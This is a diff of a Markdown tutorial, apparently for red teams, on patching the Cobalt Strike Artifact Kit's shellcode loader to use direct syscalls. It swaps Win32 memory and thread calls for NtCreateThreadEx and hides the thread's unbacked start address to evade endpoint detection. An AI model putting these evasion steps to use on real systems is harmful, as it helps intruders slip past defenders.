@@ -34,7 +34,6 @@ Add the required functions in `functions.txt` which uses `syscalls.asm` (generat
 - To use the generated `inline-assembly` using the `mingw` compiler, we change the dialect of masm to the *intel syntax* (refer [bs's blog](https://br-sn.github.io/Implementing-Syscalls-In-The-CobaltStrike-Artifact-Kit/)).
 	- Edit `build.sh` and the the dialect to the `$options` variable: `export options= -0s -masm=intel`
 - Edit `patch.c` as an example template. Split `x64` and `x86` code as they require seperate versions of inline-whispers. Add the `syscalls-asm.h` header to include the functions.
-
 	```c
 	#elif _M_X64
 	#include "syscalls-asm.h"
@@ -58,7 +57,6 @@ Add the required functions in `functions.txt` which uses `syscalls.asm` (generat
 	```
 Setup requirements to replace the functions calls. (refer [bs's blog](https://br-sn.github.io/Implementing-Syscalls-In-The-CobaltStrike-Artifact-Kit/))
 - Start by grabbing the approprate function prototypes and incorporating it in the program.
-
 	```c
 	[.............]
 	#elif _M_X64
@@ -99,7 +97,6 @@ Setup requirements to replace the functions calls. (refer [bs's blog](https://br
 	} [................]
 	```
 - Add variables as required/stated in the blog.
-
 	```c
 	void spawn(void * buffer, int length, char * key) {
 	        DWORD old;
@@ -109,7 +106,6 @@ Setup requirements to replace the functions calls. (refer [bs's blog](https://br
 
 	        [.........]
 	```
-
 - Replace `ptr` in the function module to the `base_address` variable defined above to stay in convention with the variables in the blog.
 
 Replace the function calls to their NT equivalents similar to the blog.
@@ -120,11 +116,9 @@ Replace the function calls to their NT equivalents similar to the blog.
 	- Replace `oldprotect` to `old`
 - Replace `CreateThread` with `NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, FALSE, 0, 0, 0, NULL);`
 	- Declare the variable `HANDLE thandle = NULL` 
-	> **OPSEC**: `NtCreateThreadEx` starts the thread using `base_addr` which has a start address that is not backed by a module on disk.
+> **OPSEC**: `NtCreateThreadEx` starts the thread using `base_addr` which has a start address that is not backed by a module on disk.
 	- Replace `NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, base_addr, NULL, FALSE, 0, 0, 0, NULL);` with `NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, run, base_addr, FALSE, 0, 0, 0, NULL);` to make the start address the `run` function and the `base_addr` is passed as an argument. 
-
 - Sample: (Replace `injector.c` and `patch.c` similarly to implement direct syscalls in all artifacts)
-
 	```c
 	#elif _M_X64
 	#include "syscalls-asm.h"
@@ -191,9 +185,8 @@ Replace the function calls to their NT equivalents similar to the blog.
 	        NtCreateThreadEx(&thandle, GENERIC_EXECUTE, NULL, hProc, run, base_addr, FALSE, 0, 0, 0, NULL);
 	}
 	```
-
+	
 Validate the syscalls: `VirtualAlloc()`, `VirtualProtect()` and `CreateThread` shouldn't appear now.
 - peclone: `./peclone dump ~/artifact/dist-template/artifact64.exe`
 - strings: `strings ~/artifact/dist-template/artifact64.exe | grep Virtual`
-
 > **NOTE**: `VirtualProtect` and `VirtualQuery` are called by C runtimes linked into the default mingw 64bit binaries hence these functions still appear in the import table.
